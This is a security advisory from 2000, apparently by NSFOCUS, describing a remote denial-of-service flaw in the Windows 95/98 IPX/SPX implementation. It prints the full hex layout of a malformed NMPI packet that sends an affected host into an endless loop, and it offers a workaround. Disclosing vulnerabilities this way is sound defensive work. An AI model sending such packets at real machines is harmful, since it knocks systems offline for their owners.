       Topic: Microsoft WIN9X Malformed IPX packet Denial of Service
                       Release Date£º August 16, 2000
                              Affected system:
                              ================
                           - Microsoft Windows 95
                           - Microsoft Windows 98
                   - Microsoft Windows 98 Second Edition
                           Non-affected system£º
                            ====================
                           - Microsoft Windows NT

                                  Impact:
                                 =========
     NSFOCUS security team has found a security flaw in Microsoft Win9x
   IPX/SPX protocol implementation. Exploitation of this vulnerability ,
   a malicious user can perform DoS attack to cause an affected system to
                               fail remotely.
                               Description£º
                                ============
   When a WIN9x host receives a IPX NMPI packet that has the same source
       and destination machine name of its own, it will be lead to an
      infinite loop of sending and receiving packets. This attack will
    consume a large sum of CPU resource of attacked host .The host will
                     crash with no reaction to any key.
                     Below is the format of the packet:
              FF FF FF FF FF FF ff ff ff ff ff ff 00 65 E0 E0
                         | MAC1 | MAC2 | LONG |LLC|
              03 FF FF 00 62 00 14 00 00 00 00 FF FF FF FF FF
                                   | MAC1
              FF 05 51 00 00 00 00 ff ff ff ff ff ff 05 50 00
                           | PORT| |MAC2 | PORT|
              00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
              00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 F1
              01 00 00 41 41 20 20 20 20 20 20 20 20 20 20 20
                              | COMPUTER NAME
              20 20 20 41 41 20 20 20 20 20 20 20 20 20 20 20
                              | COMPUTER NAME
                                  20 20 20
                                Workaround:
                            ===================
           Do not install IPX/SPX protocol if you don't need it.
                        Microsoft has been informed.
